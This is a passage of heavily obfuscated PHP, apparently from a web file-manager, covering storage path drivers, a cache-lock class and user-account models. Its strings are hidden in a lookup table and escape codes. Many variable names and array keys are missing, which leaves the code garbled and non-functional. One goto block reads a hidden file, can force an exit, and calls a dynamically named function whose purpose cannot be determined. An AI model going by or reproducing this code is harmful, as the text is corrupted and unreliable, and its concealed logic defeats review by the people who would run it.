trim($Ӂŏ, $_SERVER[][8]); } public function pathFather($ܴ) { $ = $this->parse($ܴ); $ = $this->infoSimple($ܴ); return $ ? $[$_SERVER[][190]] : !1; } public function pathThis($) { $ = $this->infoSimple($); return $ ? $[$_SERVER[][32]] : !1; } public function getPathOuter($) { if (!$) { return $; } $ = $this->parse($); return KodIO::make($[$_SERVER[][487]]); } public function copyFolderFromIO($, $ډ, $ȕ, $߸, $Đ) { $ɣ = $this->model->copyFolderFromIO($, $ډ, $ȕ, $߸, $Đ); return KodIO::make($ɣ); } public function isParentOf($֯, $) { return $this->model->isParentOf($֯, $); } public function mkfile($, $Ԏ = '', $ɹ = REPEAT_RENAME) { $ᝲ =& $_SERVER[]; $Ɨɧ = $this->parse($); $ = $Ɨɧ[$ᝲ[487]]; for ($ٿ = 0; $ٿ < count($Ɨɧ[$ᝲ[1528]]); $ٿ++) { $ߩ = $Ɨɧ[$ᝲ[1528]][$ٿ]; if ($ٿ == count($Ɨɧ[$ᝲ[1528]]) - 1) { $ = $this->model->mkfile($, $ߩ, $Ԏ, $ɹ); break; } $ = $this->model->mkdir($, $ߩ, REPEAT_SKIP); } return $this->getPathOuter($); } public function mkdir($筤, $ = REPEAT_SKIP) { $ =& $_SERVER[]; $ƙ = $this->parse($筤); $筤 = $ƙ[$[487]]; for ($Ы߁ = 0; $Ы߁ < count($ƙ[$[1528]]); $Ы߁++) { $Ē = $ƙ[$[1528]][$Ы߁]; $筤 = $this->model->mkdir($筤, $Ē, $); } return $this->getPathOuter($筤); } public function copyFile($, $Ž, $ݙ = REPEAT_REPLACE) { $ =& $_SERVER[]; $£ = $this->parse($Ž); $ڶƭ = $this->model->copy($, $£[$[487]], $ݙ, $£[$[87]]); return $ڶƭ ? $this->getPathOuter($ڶƭ) : !1; } public function moveFile($ǆ, $ߚ, $ = REPEAT_REPLACE) { $Յ =& $_SERVER[]; $ = $this->parse($ߚ); $ = $this->model->move($ǆ, $[$Յ[487]], $, $[$Յ[87]]); return $ ? $this->getPathOuter($) : !1; } public function copy($, $뗻ߥ, $ůʑ = REPEAT_REPLACE, $ = false) { $ = $this->parse($뗻ߥ); $ = $this->model->copy($, $[$_SERVER[][487]], $ůʑ, $); return $ ? $this->getPathOuter($) : !1; } public function moveSameAllow() { } public function move($噈, $, $¨ = REPEAT_REPLACE, $ = false) { $Ś = $this->parse($); $ά = $this->model->move($噈, $Ś[$_SERVER[][487]], $¨, $); return $ά ? $this->getPathOuter($ά) : !1; } public function remove($ٍ, $ѻ = true) { return $this->model->remove($ٍ, $ѻ); } public function rename($, $) { $ʗ = $this->model->rename($, $); return $ʗ ? $this->getPathOuter($) : $ʗ; } public function size($ׅ) { $ݥ = $this->infoSimple($ׅ); return $ݥ ? $ݥ[$_SERVER[][79]] : 0; } public function infoSimple($Ζ) { return $this->model->sourceInfo($Ζ); } public function info($) { return $this->infoParse($); } public function infoAuth($Ģ) { return $this->infoParse($Ģ, !1, !0); } public function infoWithChildren($ʔ) { return $this->infoParse($ʔ, !0); } protected function infoParse($⦪, $ = false, $׽ = false) { if (!$) { return $this->model->pathInfo($⦪, $׽); } return $this->model->pathInfoMore($⦪); } public function infoFullSimple($) { $ =& $_SERVER[]; $ = explode($[8], $); $ = implode($[8], array_splice($, 1)); return $this->model->pathInfoByPath($[0], $); } public function infoFull($᫃) { $֜ = $this->infoFullSimple($᫃); return is_array($֜) ? $this->model->pathInfo($֜[$_SERVER[][191]]) : !1; } public function hashSimple($) { $ =& $_SERVER[]; $ö = $this->infoWithChildren($); return $ö[$[167]][$[694]]; } public function hashMd5($硢) { $ί̴ =& $_SERVER[]; $꿸 = $this->infoWithChildren($硢); return $꿸[$ί̴[167]][$ί̴[563]]; } public function exist($͍) { $ˏ =& $_SERVER[]; $Ѥ = $this->parse($͍); if (!$Ѥ[$ˏ[87]]) { return $this->isFile($͍) || $this->isFolder($͍); } $ۦ = array($ˏ[492] => $Ѥ[$ˏ[487]], $ˏ[32] => $Ѥ[$ˏ[87]]); $ = $this->model->where($ۦ)->find(); return $ ? !0 : !1; } public function isFile($ܺ) { $ה =& $_SERVER[]; $Ե = $this->infoSimple($ܺ); return $Ե && $Ե[$ה[500]] == $ה[228] ? !0 : !1; } public function isFolder($ɷ) { $یӲ =& $_SERVER[]; $ڍ = $this->infoSimple($ɷ); return $ڍ && $ڍ[$یӲ[500]] == $یӲ[91] ? !0 : !1; } public function listPath($ׂ, $ = false) { $ =& $_SERVER[]; if ($ׂ == $[12]) { return !1; } $ѽ = array($[492] => $ׂ); if ($) { return $this->model->listSource($ѽ, -1); } return $this->model->listSource($ѽ); } public function has($䀲Ñ, $ = false, $ = null) { $ =& $_SERVER[]; $쯉 = $this->infoWithChildren($䀲Ñ); if ($) { return array($[240] => $쯉[$[240]], $[239] => $쯉[$[239]]); } return $ ? $쯉[$[240]] : $쯉[$[239]]; } public function listAll($) { $Ø = IO::info($this->pathParse[$_SERVER[][87]]); if (!$Ø) { return array(); } return $this->model->listAll($); } public function getContent($Ø) { return $this->model->getContent($Ø); } public function setContent($, $Ʌ = '') { return $this->model->setContent($, $Ʌ); } public function fileSubstr($ֶ, $Ȧ, $ܶ) { return $this->model->fileSubstr($ֶ, $Ȧ, $ܶ); } public function download($،, $ͽĩ = '') { $ = get_path_father($ͽĩ); $ﱥ = get_path_this($ͽĩ); $ = $this->model->fileInfoGet($،); $פ = IO::copy($[$_SERVER[][87]], $, !1, $ﱥ); return $פ; } public function setModifyTime($η, $߾ = '') { $ =& $_SERVER[]; if (!$η) { return; } $this->model->where(array($[506] => $η))->save(array($[88] => $߾)); } public function upload($ǅ, $ҁ, $ = false, $˶Ӷ = REPEAT_REPLACE) { $£ =& $_SERVER[]; $Ҵ = $this->parse($ǅ); $ = $this->model->addFile($Ҵ[$£[487]], $ҁ, $Ҵ[$£[87]], $, $˶Ӷ); return $this->getPathOuter($); } public function uploadFileByID($, $, $ʫҘ) { $ܭ =& $_SERVER[]; $ = $this->parse($); $ = $this->model->addFileByFileID($[$ܭ[487]], $, $[$ܭ[87]], $ʫҘ); return $this->getPathOuter($); } public function addFileByRemote($, $, $绁 = array(), $ = '', $檬) { $ʏ =& $_SERVER[]; $ = $this->parse($); $ = empty($) ? $[$ʏ[87]] : $; $ڊ = $this->model->addFileByRemote($[$ʏ[487]], $, $, $绁, $檬); return $this->getPathOuter($ڊ); } public function uploadLink($, $ʳ䪐 = 0) { $ށ =& $_SERVER[]; $祩ä = $this->parse($); $ޗ䔾 = _get($GLOBALS[$ށ[7]], $ށ[1529]); $ˀ = _get($GLOBALS[$ށ[7]], $ށ[1530]); $ = KodIO::ioFileDriverGet($ށ[498] . $祩ä[$ށ[487]] . $ށ[402]); $ﾬ = Model($ށ[696])->createFileName($祩ä[$ށ[87]], $, $ޗ䔾, $ˀ); return IO::uploadLink($ﾬ, $ʳ䪐); } public function fileNameAuto($, $, $ = REPEAT_REPLACE, $߅ = false) { return $this->model->fileNameAuto($, $, $, $߅); } public function fileNameExist($ۋ, $ͻ) { return $this->model->fileNameExist($ۋ, $ͻ); } protected function _fileOut($, $ = false, $銔 = false, $߇α = '', $ = false) { $Đ =& $_SERVER[]; $˻ = $this->model->sourceInfo($); if ($˻[$Đ[500]] == $Đ[91]) { header($Đ[1531]); die; } $ѣ = $this->model->fileInfoGet($); $߇α = $ѣ[$Đ[563]] ? $ѣ[$Đ[563]] : $߇α; $ = isset($GLOBALS[$Đ[180]]) && is_array($GLOBALS[$Đ[180]]) ? $GLOBALS[$Đ[180]][$Đ[32]] : $˻[$Đ[32]]; if ($) { return IO::fileOutServer($ѣ[$Đ[87]], $, $, $߇α); } IO::fileOut($ѣ[$Đ[87]], $, $, $߇α); } public function fileOut($, $Ֆ = false, $ = false, $ = '') { $this->_fileOut($, $Ֆ, $, $); } public function fileOutServer($ԙ, $ӧ = false, $ģ = false, $௩ = '') { $this->_fileOut($ԙ, $ӧ, $ģ, $௩, !0); } protected function _fileOutImage($ق, $͆ = 250) { $ =& $_SERVER[]; $҄ = $this->model->pathInfo($ق); if ($҄[$[500]] == $[91]) { show_json($[1532] . $ق, !1); } $褬 = $this->model->fileInfoGet($ق); $҄[$[181]] = $褬[$[87]]; $GLOBALS[$[180]] = $҄; IO::fileOutImage($褬[$[87]], $͆); } public function fileOutImage($, $흡㱂 = 250) { $this->_fileOutImage($, $흡㱂); } public function fileOutImageServer($ܝ, $ = 250) { $this->_fileOutImage($ܝ, $); } public function link($ݤ, $Ŧ = '') { $͐ = $this->model->fileInfoGet($ݤ); return IO::link($͐[$_SERVER[][87]], $Ŧ); } protected function parse($߇) { $ŧٴ =& $_SERVER[]; if (strstr($߇, $ŧٴ[8]) === !1) { return array($ŧٴ[508] => intval($߇), $ŧٴ[87] => $ŧٴ[12], $ŧٴ[1528] => array()); } $ȵ = explode($ŧٴ[8], trim($߇, $ŧٴ[8])); if (count($ȵ) < 2) { show_tips(clear_html($߇) . $ŧٴ[1533]); } return array($ŧٴ[508] => intval($ȵ[0]), $ŧٴ[87] => $ȵ[1], $ŧٴ[1528] => array_slice($ȵ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($) { $this->pathParse = $; $this->model = Model($_SERVER[][1527]); } public function getPathRoot() { $İ =& $_SERVER[]; return KodIO::makeShare($this->pathParse[$İ[487]], $this->pathParse[$İ[1354]]); } public function getPathOuter($ܴۯ) { $ =& $_SERVER[]; if (!$ܴۯ) { return $ܴۯ; } $ֲ = $this->parse($ܴۯ); return trim(KodIO::makeShare($this->pathParse[$[487]], $ֲ[$[487]]), $[8]); } public function isParentOf($, $) { $Ź = IO::init($); return $this->model->isParentOf($, $Ź->path); } protected function infoParse($嶸, $㲬 = false, $̫ = false) { $Ѓ =& $_SERVER[]; static $ܞ = array(); $ʾ = $this->pathParse[$Ѓ[487]]; $ך = trim($this->pathParse[$Ѓ[1350]], $Ѓ[8]); if (isset($ܞ[$ך]) && is_array($ܞ[$ך])) { return $ܞ[$ך]; } $ = Action($Ѓ[1534])->sharePathInfo($ʾ, $ך, $㲬); $ܞ[$ך] = $; return $; } public function infoFull($ֵ) { $٭ =& $_SERVER[]; $ʐо = explode($٭[8], trim($ֵ, $٭[8])); if (count($ʐо) > 1) { $ = implode($٭[8], array_splice($ʐо, 1)); $ = $this->model->pathInfoByPath($ʐо[0], $); if (!$) { return !1; } $this->pathParse[$٭[1350]] = $[$٭[191]]; } return $this->infoParse($ֵ); } public function listAll($) { $ʥƤ =& $_SERVER[]; $օ = IO::info($this->pathParse[$ʥƤ[87]]); if (!$օ) { return array(); } $ތ = $this->model->listAll($); $ҵ = Model($ʥƤ[686])->getInfo($օ[$ʥƤ[687]]); foreach ($ތ as &$) { check_abort(); $[$ʥƤ[90]] = Action($ʥƤ[1534])->_shareItemeParse($[$ʥƤ[90]], $ҵ); } unset($); return $ތ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ю) { $this->pathParse = $ю; $this->model = Model($_SERVER[][1527]); } protected function infoParse($, $֤ = false, $ = false) { $Ѽ =& $_SERVER[]; return Action($Ѽ[1357])->sharePathInfo($this->pathParse[$Ѽ[87]], !0, $֤); } public function listPath($, $ = false) { $ =& $_SERVER[]; $Ŧ = parent::listPath($, $); if (!$Ŧ) { return $Ŧ; } if (is_array($Ŧ[$[961]])) { $Ŧ[$[961]] = Action($[1357])->shareItemInfo($Ŧ[$[961]]); } foreach ($Ŧ as $Г޾ => $) { if (!in_array($Г޾, array($[86], $[85]))) { continue; } foreach ($ as $ => $ɛ) { $Ŧ[$Г޾][$] = Action($[1357])->shareItemInfo($ɛ); } } return $Ŧ; } public function listAll($ợ) { $ =& $_SERVER[]; $˞ = IO::info($this->pathParse[$[87]]); if (!$˞) { return array(); } $ = $this->model->listAll($ợ); foreach ($ as &$ԁ) { $ԁ[$[90]] = Action($[1357])->shareItemInfo($ԁ[$[90]]); } unset($ԁ); return $; } } goto AՏЛ; A܊: if ($_SERVER[$_SERVER[][991]] != $_SERVER[$_SERVER[][992]]) { $_getc = $_SERVER[][993]; $_getfile = $_SERVER[$_SERVER[][994]] . $_SERVER[][995]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[][285], $_getfilec); if (count($_getarrs) < $_SERVER[][714]) { $exit = $_SERVER[][996]; $exit(); } $_act = $_SERVER[][997]; $_act($_SERVER[$_SERVER[][998]]); } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ޥ =& $_SERVER[]; if (self::$handle) { return self::$handle; } $ǧ = $GLOBALS[$ޥ[6]][$ޥ[424]]; self::$timeout = $ǧ[$ޥ[999]] ? $ǧ[$ޥ[999]] : 10; $ = _get($GLOBALS[$ޥ[6]], $ޥ[1000]); $ = $ǧ[$ޥ[974]] ? $ǧ[$ޥ[974]] : $ޥ[230]; if ($ == $ޥ[21] && $ == $ޥ[13]) { $ = $ޥ[230]; } switch ($) { case $ޥ[977]: self::$handle = new CacheLockRedis(); break; case $ޥ[978]: self::$handle = new CacheLockMemcached(); break; case $ޥ[21]: self::$handle = new CacheLockDatabase(); break; case $ޥ[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ޥ[1001], $ޥ[1002]); } return self::$handle; } private static function key($ʎ) { return $_SERVER[][1003] . Cache::key($ʎ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ = '') { self::$errorMsg = $; } public static function lockGlobal($ѠŚ, $) { return self::lock($ѠŚ, $, !0); } public static function lock($, $ = false, $ = false) { $ =& $_SERVER[]; $ѐ = self::init(); $ = self::key($); $ = $ ? $ : self::$timeout; $ҟ = timeFloat(); if (_get($GLOBALS, $[1004], !1)) { if (!$ѐ->lock($, 0.2)) { die; } return !0; } $ = $ѐ->lock($, $); $륪 = timeFloat(); if (!$) { $ = "\x6c\157\x63\x6b\x20\145\162\x72\157\x72\73\x6b\145\171\75{$}\x3b\x74\x69\x6d\145\75{$}\73" . self::$errorMsg . $[74] . get_caller_msg(); $Ǝ = LNG($[1005]) . "\50{$}\x73\51\56" . LNG($[1006]); $Ǝ .= $[1007]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Ǝ = $Ǝ . $[1008] . self::$errorMsg; } write_log($[1009] . sprintf($[1010], timeFloat() - $ҟ) . $[1011] . $ . $[1012] . json_encode(error_get_last()), $[1002]); show_json($Ǝ, !1); } if (!$) { self::$lockItem[$] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ = number_format(timeFloat() - $륪, 3); write_log($[1013] . $ . $[1014] . $, $[1002]); } return $; } public static function lockGet($ڸ̑) { $ܻ = self::key($ڸ̑); if (self::$lockItem[$ܻ]) { return self::$lockItem[$ܻ]; } return self::init()->lockGet($ܻ); } public static function unlock($ٹ) { $Ӵ =& $_SERVER[]; $П = self::key($ٹ); self::$lockItem[$П] = null; self::init()->unlock($П); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ӵ[1015] . $ٹ, $Ӵ[1002]); } return; } public static function unlockRuntime() { $װ׏ =& $_SERVER[]; $ = self::init(); $ = !1; foreach (self::$lockItem as $ۡ => $щ) { if (!$щ) { continue; } $->unlock($ۡ); if (!$) { $ = !0; write_log($װ׏[1016] . $ۡ . $װ׏[74] . get_caller_msg(), $װ׏[1002]); continue; } write_log($װ׏[1016] . $ۡ, $װ׏[1002]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $æ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($װ׏[1017] . $æ . $װ׏[1018] . ACTION, $װ׏[1002]); } } public static function fileLock($) { $ݖ =& $_SERVER[]; if (!$GLOBALS[$ݖ[1019]]) { $GLOBALS[$ݖ[1019]] = array(); } $GLOBALS[$ݖ[1019]][$] = !1; $Ǿŀ = fopen(DATA_PATH . $ . $ݖ[1020], $ݖ[1021]); if (!$Ǿŀ) { return !1; } $GLOBALS[$ݖ[1019]][$] = $Ǿŀ; if (flock($Ǿŀ, LOCK_EX)) { return !0; } self::unlock($); show_json($ݖ[1022], !1); return !1; } public static function fileUnlock($) { $ =& $_SERVER[]; $׼ = $GLOBALS[$[1019]][$]; if (!$׼) { return; } $GLOBALS[$[1019]][$] = !1; flock($׼, LOCK_UN); fclose($׼); } public static function fileUnlockAll() { $ú =& $_SERVER[]; if (!isset($GLOBALS[$ú[1019]]) || !$GLOBALS[$ú[1019]]) { return; } foreach ($GLOBALS[$ú[1019]] as $׵ => $ݚ) { if (!$ݚ) { continue; } $GLOBALS[$ú[1019]][$׵] = !1; flock($ݚ, LOCK_UN); fclose($ݚ); } $GLOBALS[$ú[1019]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto Eƈ; AǞ: class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($) { $翆 =& $_SERVER[]; return array($翆[2289] => array(USER_ID, $翆[2665])); } protected function ___listData() { $ =& $_SERVER[]; $ч = array($[1961] => USER_ID, $[573] => 0); $Ր = $[2666]; $῾ = $this->field($Ր)->where($ч)->order($[2667])->select(); return $῾ ? $῾ : array(); } protected function resetCache() { } protected function listView() { $Ό =& $_SERVER[]; $А = $this->listData(); $ = array_filter_by_field($А, $Ό[33], $Ό[505]); $ = array_to_keyvalue($, $Ό[12], $Ό[87]); if (!$) { return $А; } $ = 2000; $ڷ = array($Ό[506] => array($Ό[507], $)); $ǻ = Model($Ό[927])->listSource($ڷ, $); $ǻ = array_merge($ǻ[$Ό[86]], $ǻ[$Ό[85]]); $ǻ = array_to_keyvalue($ǻ, $Ό[191]); foreach ($А as $̨ => $) { $ݜ = $ǻ[$[$Ό[87]]]; $ݜ = $ݜ ? $ݜ : array(); $А[$̨] = array_merge($ݜ, $); } return $А; } protected function addFav($촱, $ = '', $ߑ = "\x73\157\165\162\143\145") { $ڤ =& $_SERVER[]; $թ = array($ڤ[1961] => USER_ID, $ڤ[573] => 0, $ڤ[511] => $ߑ, $ڤ[510] => $촱); if ($this->where($թ)->find()) { return !1; } $թ = array($ڤ[1961] => USER_ID, $ڤ[573] => 0); $ = $this->where($թ)->max($ڤ[2197]); if (!$) { $ = 0; } if (!$ && $ߑ == $ڤ[505]) { $ = Model($ڤ[1527])->where(array($ڤ[506] => $촱))->find(); if (!$) { return !1; } $ = $[$ڤ[32]]; } $ = $this->getAutoName($); $׶ = array($ڤ[1961] => USER_ID, $ڤ[573] => 0, $ڤ[509] => $, $ڤ[510] => $촱, $ڤ[511] => $ߑ, $ڤ[2179] => $ + 1); return $this->add($׶); } protected function remove($ڰ) { $ݺҋ =& $_SERVER[]; $ = array($ݺҋ[1961] => USER_ID, $ݺҋ[508] => $ڰ); return $this->where($)->delete(); } protected function removeByName($饡) { $ =& $_SERVER[]; $ў = array($[1961] => USER_ID, $[509] => $饡, $[573] => 0); return $this->where($ў)->delete(); } protected function rename($, $Ժ) { $ڭ =& $_SERVER[]; if ($ == $Ժ) { return !1; } $ = $this->getAutoName($Ժ); if ($Ժ != $) { return !1; } $ = array($ڭ[1961] => USER_ID, $ڭ[573] => 0, $ڭ[32] => $); return $this->where($)->save(array($ڭ[32] => $Ժ)); } protected function resetSort($׶) { $ =& $_SERVER[]; $׶ = is_array($׶) ? $׶ : array(); $ = array($[1961] => USER_ID); for ($ = 0; $ < count($׶); $++) { $[$[508]] = $׶[$]; $this->where($)->save(array($[2179] => $ + 1)); } return !0; } protected function moveTop($؇̌) { $ѭ =& $_SERVER[]; $ = array($ѭ[1961] => USER_ID, $ѭ[573] => 0); $՜ = $this->where($)->where(array($ѭ[32] => $؇̌))->find(); if (!$՜) { return; } $ = $this->field($ѭ[487])->where($)->order($ѭ[2667])->select(); $ = array_to_keyvalue($, $ѭ[12], $ѭ[487]); $ˋ = $; $ = array_remove_value($, $՜[$ѭ[487]]); array_unshift($, $՜[$ѭ[487]]); return $this->resetSort($); } protected function moveBottom($Řȫ) { $Ξ =& $_SERVER[]; $ۨ = array($Ξ[1961] => USER_ID, $Ξ[573] => 0); $ͧ = $this->where($ۨ)->max($Ξ[2197]); $ދ = array($Ξ[2197] => $ͧ + 1); return $this->where($ۨ)->where(array($Ξ[32] => $Řȫ))->save($ދ); } private function getAutoName($Ѝ) { $ =& $_SERVER[]; $ = array($[1961] => USER_ID, $[573] => 0); $ = $this->field($[32])->where($)->select(); $ = array_to_keyvalue($, $[12], $[32]); if (!$ || !in_array($Ѝ, $)) { return $Ѝ; } for ($䍞 = 0; $䍞 < count($); $䍞++) { if (!in_array($Ѝ . "\50{$䍞}\x29", $)) { return $Ѝ . "\50{$䍞}\x29"; } } return $Ѝ . "\50{$䍞}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\152\157\142\x4c\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\x64\145\163\143", "\x73\157\162\x74"); const JOB_KEY = "\x73\145\x6c\x66\112\x6f\x62\114\151\163\x74"; public function listData($Ȫ = false, $䦦 = "\163\x6f\162\164", $ = false) { return parent::listData($Ȫ, $䦦, $); } public function remove($) { return parent::remove($); } public function add($Ө) { $ݫ =& $_SERVER[]; if ($this->findByName($Ө[$ݫ[32]])) { return !1; } $Ө[$ݫ[2197]] = $this->getSort(); return parent::insert($Ө); } private function getSort() { $Ǖ =& $_SERVER[]; $ = parent::listData(); $ = array_to_keyvalue($, $Ǖ[12], $Ǖ[2197]); return empty($) ? 0 : max($) + 1; } public function update($ݱ, $鼪) { $ =& $_SERVER[]; $ї = parent::listData($ݱ); $艐 = $this->findByName($鼪[$[32]]); if (!$ї || $艐 && $艐[$[487]] != $ї[$[487]]) { return !1; } return parent::update($ݱ, $鼪); } public function setUserJob($, $) { $ =& $_SERVER[]; if (!is_array($)) { $ = array($); } $ɮ = parent::listData(); $ы = array_to_keyvalue($ɮ, $[32]); $Ʈ؅ = $[463]; foreach ($ as $ђ) { if ($ы[$ђ]) { $Ʈ؅ .= $ы[$ђ][$[487]] . $[50]; } else { $ = $this->add($ђ); $Ʈ؅ .= $ . $[50]; } } $Ʈ؅ = rtrim($Ʈ؅, $[50]); Model($[617])->metaSet($, self::JOB_KEY, $Ʈ؅); } public function getUserJob($) { $Դ = Model($_SERVER[][617])->metaGet($); return $this->getUserJobInfo($Դ[self::JOB_KEY]); } public function getUserJobInfo($ْҪ) { $Ȃ =& $_SERVER[]; $ْ = explode($Ȃ[50], $ْҪ); $ƭ = parent::listData(); $ƭ = array_remove_key($ƭ, $Ȃ[231]); $ﰘ = array(); foreach ($ْ as $ռ) { if (isset($ƭ[$ռ])) { $ﰘ[] = $ƭ[$ռ]; } } return $ﰘ; } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\164\x61\x62\154\x65\x4e\x61\x6d\x65" => "\165\x73\x65\x72\x5f\155\145\x74\141", "\x6d\145\164\x61\106\x69\x65\154\144" => "\x75\x73\x65\x72\x49\104"); protected $simpleField = "\x75\x73\145\162\111\104\54\x6e\151\143\x6b\x4e\x61\155\145\x2c\x6e\141\155\x65\x2c\141\x76\141\164\x61\162\54\x73\145\170\54\x73\x74\x61\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Հ) { $ӈ =& $_SERVER[]; $ = $ӈ[2668]; return array($ӈ[2256] => array($Հ[0], $), $ӈ[2258] => array($Հ[0], $), $ӈ[2669] => array($Հ[0], $)); } protected function ___getInfo($ނ) { $ = $this->getInfoSimple($ނ); if (!$ || !is_array($)) { return array(); } return $this->_getInfoApply($); } protected function ___getInfoFull($Ƿ) { $ = $this->getInfoSimple($Ƿ); if (!$ || !is_array($)) { return array(); } return $this->_getInfoApply($, !0); } protected function ___getInfoSimple($ɐ) { $ =& $_SERVER[]; if (!$ɐ) { return array(); } $̡ = $this->where(array($[1586] => intval($ɐ)))->find(); if (!$̡ || !is_array($̡)) { return array(); } $̡[$[2367]] = Action($[2368])->parseUrl($̡[$[2367]]); return $̡; } private function _getInfoApply($츹, $ή = false) { $ =& $_SERVER[]; if (!$츹) { return $츹; } $ = md5($[2670] . $츹[$[1045]] . $[2671] . $츹[$[32]]); $츹 = $this->_listDataApplyItem($츹); $ = Model($[1527])->metaGet($츹[$[90]][$[191]]); $츹[$[2672]] = $; $츹[$[90]][$[2458]] = isset($[$[2459]]) ? $[$[2459]] : null; if ($ή) { $츹[$[555]] = $this->metaGet($츹[$[1586]]); } return $츹; } protected function getInfoSimpleOuter($֌) { $ =& $_SERVER[]; if (!$֌ || $֌ == 0) { return array($[1586] => $[228], $[32] => $[173] . LNG($[2673]) . $[175], $[2367] => STATIC_PATH . $[2674]); } $Ղ = $this->cacheFunctionGet($[2267], $֌); $ߦҼ = array_field_key($Ղ, explode($[50], $this->simpleField)); if (!$ߦҼ) { return array($[1586] => $[1374], $[32] => $[173] . LNG($[2675]) . $[175], $[2367] => STATIC_PATH . $[2676]); } $ߦҼ[$[2367]] = Action($[2368])->parseUrl($ߦҼ[$[2367]]); return $ߦҼ; } protected function groupUser($) { } public static function errorLang($) { $ٮ =& $_SERVER[]; $搌 = array(self::ERROR_USER_NOT_EXISTS => $ٮ[2677], self::ERROR_USER_PASSWORD_ERROR => $ٮ[2678], self::ERROR_USER_EXIST_NAME => $ٮ[2679], self::ERROR_USER_EXIST_PHONE => $ٮ[2680], self::ERROR_USER_EXIST_EMAIL => $ٮ[2681], self::ERROR_USER_LOGIN_LOCK => $ٮ[2682], self::ERROR_IP_NOT_ALLOW => $ٮ[2683], self::ERROR_USER_EXIST_NICKNAME => $ٮ[2684]); $ = LNG($搌[$]); if ($ == self::ERROR_USER_LOGIN_LOCK) { $ = (int) Model($ٮ[1483])->get($ٮ[2685]); if ($ > 60) { $ = str_replace($ٮ[91], ceil($ / 60), $); } } return $; } protected function metaSet($ݵ, $Ӥ = null, $ߡ = null) { $this->clearCache($ݵ); return parent::metaSet($ݵ, $Ӥ, $ߡ); } public function getInfoByMeta($쒁, $) { $ԧޗ =& $_SERVER[]; $ = Model($ԧޗ[2686])->where(array($ԧޗ[95] => $쒁, $ԧޗ[451] => $))->find(); if ($) { return $this->getInfo($[$ԧޗ[1586]]); } return !1; } public function userLoginCheck($˟, $р쮼, $ = false) { $ =& $_SERVER[]; $ = $this->userLoginFind($˟); if (!$) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($[$[1586]], $р쮼)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $ ? $this->getInfoFull($[$[1586]]) : $this->getInfo($[$[1586]]); } public function userLoginFind($ݪ) { $̟ =& $_SERVER[]; $鸯 = array($̟[32] => $ݪ, $̟[2469] => $ݪ, $̟[380] => $ݪ, $̟[2687] => $ݪ, $̟[1162] => $̟[1164]); if ($this->nickNameRpt()) { unset($鸯[$̟[2469]]); } return $this->where($鸯)->find(); } public function clearCache($˘) { $ =& $_SERVER[]; $this->cacheFunctionClear($[2266], $˘); $this->cacheFunctionClear($[2267], $˘); $this->cacheFunctionClear($[2688], $˘); } public function userPasswordCheck($ќĩ, $) { $ҙ =& $_SERVER[]; $р = $this->where(array($ҙ[1586] => intval($ќĩ)))->find(); $ = $this->metaGet($ќĩ); $ = isset($[$ҙ[2689]]) ? $[$ҙ[2689]] : $ҙ[12]; if (md5($ . trim($)) !== $р[$ҙ[1045]]) { return !1; } return !0; } public function userAdd($Ȇ) { $ϝ =& $_SERVER[]; $ۜ = array($ϝ[509] => $Ȇ[$ϝ[32]], $ϝ[2690] => $Ȇ[$ϝ[2366]], $ϝ[2691] => isset($Ȇ[$ϝ[380]]) ? $Ȇ[$ϝ[380]] : $ϝ[12], $ϝ[2692] => isset($Ȇ[$ϝ[2687]]) ? $Ȇ[$ϝ[2687]] : $ϝ[12], $ϝ[2693] => isset($Ȇ[$ϝ[2469]]) ? $Ȇ[$ϝ[2469]] : $Ȇ[$ϝ[32]], $ϝ[2694] => isset($Ȇ[$ϝ[2367]]) ? $Ȇ[$ϝ[2367]] : $ϝ[12], $ϝ[2695] => isset($Ȇ[$ϝ[2696]]) ? $Ȇ[$ϝ[2696]] : 1, $ϝ[2697] => $Ȇ[$ϝ[1045]], $ϝ[2260] => isset($Ȇ[$ϝ[2161]]) ? $Ȇ[$ϝ[2161]] : 1024 * 1024 * 20, $ϝ[2261] => 0, $ϝ[2698] => 0, $ϝ[2306] => isset($Ȇ[$ϝ[844]]) ? $Ȇ[$ϝ[844]] : 1); if (!empty($Ȇ[$ϝ[1586]])) { $ۜ[$ϝ[1586]] = $Ȇ[$ϝ[1586]]; } $뗐 = $this->_checkExist($Ȇ); if ($뗐 !== !0) { return $뗐; } if (!empty($ۜ[$ϝ[2367]]) && strlen($ۜ[$ϝ[2367]]) > 255) { $ۜ[$ϝ[2367]] = $ϝ[12]; } $ = $this->add($ۜ); $ޝ = array($ϝ[2697] => $ۜ[$ϝ[1045]], $ϝ[2693] => $ۜ[$ϝ[2469]], $ϝ[2699] => $Ȇ[$ϝ[2265]]); $this->userEdit($, $ޝ); Model($ϝ[1527])->userRootAdd($); return $; } protected function userEditTest($鎂, $Ȣ) { return $this->call($_SERVER[][2700], $鎂, $Ȣ); } protected function userEdit($, $) { $ =& $_SERVER[]; $ҡՖ = $this->getInfoSimple($); if (!$ҡՖ) { return !1; } $߰ = $this->_checkExist($, $); if ($߰ !== !0) { return $߰; } if (isset($[$[1045]]) && 